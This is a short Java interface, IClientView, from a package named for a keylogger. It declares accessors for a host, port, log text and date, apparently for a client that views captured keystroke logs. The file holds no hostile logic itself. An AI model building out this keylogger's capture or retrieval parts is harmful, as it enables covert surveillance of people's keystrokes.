package com.hao.keylogger.controllers;

import java.util.Date;

public interface IClientView {
	String getHost();
	int getPort();
	String getLog();
	Date getDatePicked();
	
	void setHost(String host);
	void setPort(int port);
	void setLogContent(String log);
	
	void setController(ClientLogController controller);
}
